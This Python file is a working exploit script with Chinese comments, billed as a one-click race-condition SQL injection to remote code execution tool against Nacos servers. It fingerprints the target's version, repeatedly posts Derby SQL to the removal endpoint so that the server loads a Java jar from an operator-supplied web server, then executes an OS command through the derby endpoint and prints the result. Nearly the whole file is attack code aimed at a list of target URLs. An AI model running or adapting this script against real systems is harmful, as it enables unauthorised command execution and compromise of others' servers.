# -*- coding:utf-8 -*-
# @FileName  :check.py
# @Time      :2024/12/6 3:21
# Author: lbb


# -*- coding:utf-8 -*-
# @FileName  :exp.py
# @Time      :2024/12/5 23:47
# Author: lbb


import json
import random
import sys
import requests
import urllib3
from urllib.parse import urljoin


class Check:
    """
    初始化程序
    :param flag: 是否启用代理的标志，为布尔类型，True表示启用代理，False表示不启用代理
    """

    def __init__(self, flag):
        # logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(message)s')
        self.flag = flag
        self.jwt = self.start_ini('jwt')
        self.url = self.start_ini('url')
        self.service = self.start_ini('web_server')
        self.proxies = {'http': "http://127.0.0.1:8081", 'https': "https://127.0.0.1:8081"}
        self.headers = {
            'accessToken': self.jwt,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/97.0.4692.71 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'zh-CN,zh;q=0.9',
        }
        print(f"[+] 当前身份认证信息{self.jwt}")
        print(f"[+] 当前设置web server 地址 {self.service}")

    """
    定义POST请求方法
    :param url: 传入的url地址
    :param flag: 是否启用代理的标志，为布尔类型，True表示启用代理，False表示不启用代理
    :param data: post请求体数据
    """

    def re_post(self, url, flag, files) -> str:
        urllib3.disable_warnings()
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        while True:
            try:
                r = requests.post(url, files=files, headers=self.headers,
                                  verify=False,
                                  proxies=self.proxies if flag else None)
                code = r.status_code
                if code == 200:
                    # 任务请求成功
                    return r.text
                elif code == 401 or code == 403:
                    # 任务正在使用，等待后重试
                    exit(f"[+] 当前状态码 {code} 需要登录? 确定是nacos系统吗？ 路径是否错误？当前路径 {url}")
                else:
                    raise requests.exceptions.HTTPError(f"Unexpected status code: {code}")
            except requests.exceptions.HTTPError as error:
                print(f"[+] HTTP错误: {error}")
                break
            except requests.exceptions.ConnectionError as error:
                print(f"[+] 连接错误: {error}")
                break
            except requests.exceptions.Timeout as error:
                print(f"[+] 请求超时: {error}")
                break
            except requests.exceptions.RequestException as error:
                print(f"[+] 请求错误: {error}")
                break

        """
        定义GET请求方法
        :param url: 传入的url地址
        :param flag: 是否启用代理的标志，为布尔类型，True表示启用代理，False表示不启用代理
        """

    """
    定义GET请求方法
    :param url: 传入的url地址
    :param flag: 是否启用代理的标志，为布尔类型，True表示启用代理，False表示不启用代理
    """

    def re_get(self, url, get_sql) -> str:
        flag = self.flag
        urllib3.disable_warnings()
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        while True:
            try:
                r = requests.get(url, params={'sql': get_sql}, headers=self.headers,
                                 verify=False,
                                 proxies=self.proxies if flag else None)
                code = r.status_code
                if code == 200:
                    # 任务请求成功
                    return r.text
                elif code == 401 or code == 403:
                    # 任务正在使用，等待后重试
                    print(f"[+] 文件似乎上传成功了？，当前状态码{code} 是否需要登录？")
                    print("[+] 文件上传失败！，请检查版本或配置文件？当前环境是否存在ids waf？")
                else:
                    raise requests.exceptions.HTTPError(f"Unexpected status code: {code}")
            except requests.exceptions.HTTPError as error:
                print(f"[+] HTTP错误: {error}")
                break
            except requests.exceptions.ConnectionError as error:
                print(f"[+] 连接错误: {error}")
                break
            except requests.exceptions.Timeout as error:
                print(f"[+] 请求超时: {error}")
                break
            except requests.exceptions.RequestException as error:
                print(f"[+] 请求错误: {error}")
                break

    """
    是否是可以利用的版本
    :param url: 传入的url地址
    """

    def check_vulnerability_version(self, url) -> None:

        check_url = urljoin(url, "nacos/v1/console/server/state")
        data = self.re_get(check_url, self.flag)
        json_data = json.loads(data)
        version = json_data['version']
        vulnerability_version = ['2.3.2', '2.3.1', '1.4.7 ', '2.3.0', '2.3.0-BETA', '2.2.4', '2.2.3', '1.4.6', '2.2.2',
                                 '2.2.1', '1.4.5', '2.2.0.1', '2.2.1-RC', '2.2.0', '2.2.0-BETA', '2.1.2', '2.1.1',
                                 '1.4.4', '2.1.0', '2.1.0-BETA', '1.4.3', '2.0.4', '2.0.3', '2.0.2', '2.0.1', '1.4.2',
                                 '2.0.0', '2.0.0-BETA', '2.0.0-ALPHA.2', '1.4.1', '2.0.0-ALPHA.1', '1.4.0',
                                 '1.4.0-BETA', '1.3.2', '1.3.1', '1.3.1-BETA', '1.3.0', '1.2.1', '1.2.0-beta.1',
                                 '1.2.0-beta.0', '1.1.4', '1.1.3', '1.1.0', '1.0.1', '1.0.0', '1.0.0-RC3', '1.0.0-RC2',
                                 '0.9.0', '0.8.0', '0.7.0', '0.6.1', '0.6.0', '0.5.0', '0.4.0', '0.3.0', '0.3.0-RC1',
                                 '0.2.1', '0.2.1-RC1', 'v0.2.0', 'v0.1.0']
        if version in vulnerability_version:
            print(f"[+] 当前版本{version} 在漏洞版本中！")
        else:
            print(f"[+] 当前版本{version} 不在漏洞版本中，请检查是否低于<=2.3.2利用条件")
            print(f"[+] 当前版本{version} 不在漏洞版本中，已开始尝试强制利用失败率过高！")

    """
    条件竞争上传文件
    :param url: 传入的url地址
    """

    def up_file(self, url, command="whoami") -> None:
        global ids
        up_file_api = urljoin(url, '/nacos/v1/cs/ops/data/removal')
        for i in range(0, sys.maxsize):

            ids = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
            post_sql = """CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)\n
                    CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{id}')\n
                    CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\n""".format(
                id=ids, service=self.service)

            files = {'file': post_sql}
            data = self.re_post(up_file_api, self.flag, files)
            json_data = json.loads(data)
            if json_data['code'] == 200:
                print("[+] 文件上传成功！")
                break
            else:
                if i > 50:
                    print("[+] 文件上传失败！，请检查版本或配置文件？当前环境是否存在ids waf？")
                    print(f"[+] 当前上传{i}次数已超过50次")
        self.show_command(url, ids, command)

    """
    条件竞争上传文件
    :param url: 传入的url地址
    """

    def show_command(self, url, ids, command) -> None:
        derby_api = urljoin(url, '/nacos/v1/cs/ops/derby')
        get_sql = "select * from (select count(*) as b, S_EXAMPLE_{id}('{cmd}') as a from config_info) tmp /*ROWS FETCH NEXT*/".format(
            id=ids, cmd=command)

        data = self.re_get(derby_api, get_sql)
        print(f"[+] 当前目标 {url}")
        print(f"[+] 执行命令 {command}")
        print(f"[+] 查询执行命令结果 {command}")
        json_data = json.loads(data)
        dict_data = json_data['data'][0]
        print(f"[+] {dict_data['A']}")

    """
    是否是可以利用的版本
    :param url: 传入的url地址
    """

    def check_vulnerability(self) -> None:
        for url in self.url:
            self.check_vulnerability_version(url)
            self.up_file(url)

    """
    是否是可以利用的版本
    :param filename: 读取文件的名称
    """

    @staticmethod
    def start_ini(filename) -> None:
        if filename == 'jwt':
            try:
                with open('jwt', "r", encoding='utf-8') as f:
                    jwt = f.read().strip()  # 读取文件内容并去除可能存在的空白字符
                    if not jwt:  # 检查jwt是否为空
                        print(f"[+] 当前jwt值为空，当前nacos不需要权限吗？")
                        jwt = ""
            except FileNotFoundError:
                print(f"[+] 文件打开错误！")
            except Exception as e:
                print(f"[+] {e}")
            return jwt
        elif filename == 'url':
            try:
                with open('url', "r", encoding='utf-8') as f:

                    urls = f.readlines()
                    if not urls:  # 检查jwt是否为空
                        print(f"[+] 当前目标为空！")
                        exit()
                    return [url.strip() for url in urls]
            except FileNotFoundError:
                print(f"[+] 文件打开错误！")
            except Exception as e:
                print(f"[+] {e}")
        elif filename == "web_server":
            if filename == 'web_server':
                try:
                    with open('web_server', "r", encoding='utf-8') as f:
                        service = f.read().strip()  # 读取文件内容并去除可能存在的空白字符
                        if not service:  # 检查jwt是否为空
                            print(f"[+] 当前web_server配置为空，这是必须要配置的选项！")
                            service = "127.0.0.1:5000"
                except FileNotFoundError:
                    print(f"[+] 文件打开错误！")
                except Exception as e:
                    print(f"[+] {e}")
                return service

        else:
            print(f"[+] 初始化错误！")


if __name__ == '__main__':
    print('''
            Nacos removal 条件竞争 SQL 注入至RCE 一键利用脚本
            by charis/lbb
            2024/12/06 
            ''')
    exp = Check(True)
    exp.check_vulnerability()
